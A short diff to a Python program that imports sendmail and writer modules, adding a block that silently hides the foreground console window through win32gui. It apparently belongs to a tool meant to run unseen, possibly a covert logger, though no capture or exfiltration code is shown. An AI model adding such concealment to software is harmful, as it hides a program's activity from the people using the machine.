@@ -6,6 +6,13 @@ import config
 import sendmail
 import writer
 
+try:
+    import win32gui, win32con
+    The_program_to_hide = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)
+except:
+    pass
+
 
 def convertNonStringKeys(dict_):
     return {str(key): val for key, val in dict_.items()}
